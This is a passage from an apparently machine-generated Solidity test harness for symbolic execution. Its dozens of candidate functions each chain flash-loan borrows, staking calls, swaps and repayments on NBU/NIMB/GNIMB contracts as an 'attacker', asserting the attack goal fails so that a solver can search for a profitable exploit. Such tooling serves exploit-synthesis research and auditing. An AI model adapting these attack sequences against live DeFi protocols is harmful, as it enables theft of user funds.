        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
